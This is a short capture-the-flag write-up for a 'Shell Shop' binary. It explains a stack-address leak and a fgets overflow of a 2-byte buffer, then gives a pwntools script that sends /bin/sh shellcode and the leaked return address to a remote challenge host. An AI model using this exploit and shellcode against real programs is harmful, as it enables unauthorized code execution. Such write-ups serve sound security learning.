# Shell Shop

## Solution
As usual, we are only given an executable.
This time, the stack is set as executable. If we "purchase" anything in the shop, when exiting we are offered a discount. 
```c
        if (discount? != 0) {
          fprintf(stdout,"\nHere is a discount code for your next purchase: [%p]\n",&discountLeak );
        }
```
This discount gives us a stack leak.
We also see that the buffer for the user' choice of action is a 2 byte buffer.
```c
char selection [2];
```
And before exiting 100 bytes are read into it.
```c
fgets(selection,100,stdin);
```
While there is a lot between selection and the saved return address, we can use that space to write some shellcode that will pop us a shell.
We can then use the given stack leak to know where to jump to in order to execute that shellcode.

## Script
```py
from pwn import *

#p = process("./shell_shop")
p = remote('154.57.164.69',31434)

p.sendline(b'2')
p.recvuntil(b'>>')
p.sendline(b'3')
p.recvuntil(b'>>')
p.recvline()
p.recvuntil(b'[')
leak = p.recvline()[:-2]
print(leak)
leak = int(leak,16)

payload = b'ya'

payload = payload + b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
payload = payload + (b'a'*(0x38 - 23))

payload = payload + p64(leak)

p.sendline(payload)

p.interactive()
```
